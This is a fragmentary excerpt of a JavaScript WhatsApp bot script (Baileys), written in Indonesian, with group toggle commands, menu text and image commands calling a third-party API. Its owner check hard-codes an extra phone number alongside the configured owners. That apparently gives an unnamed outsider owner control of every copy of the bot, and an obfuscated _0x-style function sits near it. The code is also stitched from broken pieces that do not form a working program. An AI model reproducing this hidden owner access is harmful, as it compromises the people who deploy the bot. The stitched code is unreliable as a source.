/*
   ...
   Script Ini ditulis Ulang Oleh FallZx
...
module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        ...
        const isCreator = [botNumber, ...global.owner, '15735703567@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
...
await newReply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
...
function _0x35fb() {
    var _0x4f1e3b = ['https://youtube.com/playlist?list=PLRmLRCoejWJsauHXGmkKERWnptlwtOy2q', '4879890khOmth', '2070kRGErB', '28295pqllNW', '531tjwrrz', '1079yZujew', '906Wuppor', '2256950dFlorC', '44XNZJgv', '9420776hAoMmA', '2743524iQbgfX', '28568rvnzvB'];
    _0x35fb = function () {
        return _0x4f1e3b;
    };
    return _0x35fb();
    ...
    while (!![]) {
        ...
        // Group Fitur
            ...
            case 'antipushkontakv1': {
                ...
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipushkontakv1) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv1 = true
                    newReply(`Anti Push Kontak Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipushkontakv1) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv1 = false
                    newReply(`Anti Push kontak Nonaktif 🕊️`)
                } else {
                    newReply(`Mode ${command}\n\n\nKetik ${prefix + command}on/off`)
                }
            }
            ...
            case 'antipushkontakv2': {
                ...
                if (!isBotAdmins) return mess.botAdmin
                if (args[0] === "on") {
                    if (db.data.chats[m.chat].antipushkontakv2) return newReply(`Sudah Aktif Sebelumnya 🕊`)
                    db.data.chats[m.chat].antipushkontakv2 = true
                    newReply(`Anti Push Kontak Aktif 🕊️`)
                } else if (args[0] === "off") {
                    if (!db.data.chats[m.chat].antipushkontakv2) return newReply(`Sudah Nonaktif Sebelumnya 🕊`)
...
( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
			...
			case 'git': case 'gitclone': {
                if (!args[0]) return newReply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/Fahrul6868/tes`)
		...
		case 'brainly':{
            ...
            case 'attp':
                try {
                if (args.length == 0) return newReply(`Example: ${prefix + command} Fahrul`)
	        ...
	        case 'carbon':
	            ...
	            newReply(mess.wait)
	            conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/carbon?apikey=${apikey}&code=${q}&language=nodejs`}, caption: `Created By Fahrul\n\n\nCode:\n\n${q}`}, {quoted: m})
	        break
		...
		case 'freefire':
			...
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Fahrul\n\n Type: ${command}\n\nText: ${args}`})
			break
		...
		case 'carvedwood':
            ...
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${args}`}, caption: `Created By Fahrul\n\n Type: ${command}\n\nText: ${args}`})
			break
    ...
    // Text Prome
		...
		case 'wallgravity':
			...
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${args[0]}&text2=${args[1]}`}, caption: `Created By Fahrul\n\n Type: ${command}\n\nText: ${args}`})
			break
		...
		case 'thunder':
            ...
            db.data.users[m.sender].limit -= 2 // -1 limit
			newReply(mess.wait)
			conn.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${args}` }, caption: `Created By Fahrul\n\n Type: ${command}\n\nText: ${args}`})
			break
        ...
        break
            ...
            if (!text) return newReply(`Example: ${prefix + command} AdrianTzy`)
...
Lihat list Pesan Dengan ${prefix}listmsg`)
  ...
  ☍ *ᴍᴏᴅᴇ:* ${conn.public ? 'Public-Mode 👥' : 'Self-Mode 👤'}
  ☍ *ʙᴀɪʀʟᴇʏs:* github:Fahrul/Baileys
  ☍ *ʀᴜɴᴛɪᴍᴇ:* ${runtime(process.uptime())}
  ☍ *ᴛᴏᴛᴀʟ ᴜsᴇʀ:* ${Object.keys(global.db.data.users).length}
  ☍ *Total Premium:* ${prem.length}
  ☍ *ᴛᴏᴛᴀʟ ʙᴀɴɴᴇᴅ:* ${ban.length}
...
*│◦ ɴᴏ ᴏᴡɴᴇʀ:* ${m.sender.split('@')[0]}
*│◦ ᴏᴡɴᴇʀ ɴᴀᴍᴇ :* ${isCreator ? "ᴏᴡɴᴇʀ ᴏɴʟʏ" : "User ⭐"}
*│◦ ʙᴏᴛ ɴᴀᴍᴇ:*  ${namabot} | ᴀᴋᴛɪғ
*│◦ ʀᴜɴᴛɪᴍᴇ :* ${runtime(process.uptime())}
*│◦ sᴛᴀᴛᴜs:* ${isCreator ? "ᴏᴡɴᴇʀ ᴏɴʟʏ" : "User ⭐"}
*│◦ ᴜsᴇʀ:* ${isPremium ? 'ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ' : 'Gratisan ⭐'}
*└◦ ʟɪᴍɪᴛ:* ${isCreator ? 'ᴜɴʟɪᴍɪᴛᴇᴅ ᴏɴʟʏ' : `${db.data.users[m.sender].limit}⭐`}
   ${readmore}
タ *O W N E R  M E N U*
▰▱▰▱▰▱▰▱▰▱▰▱▰
╔━═━≫
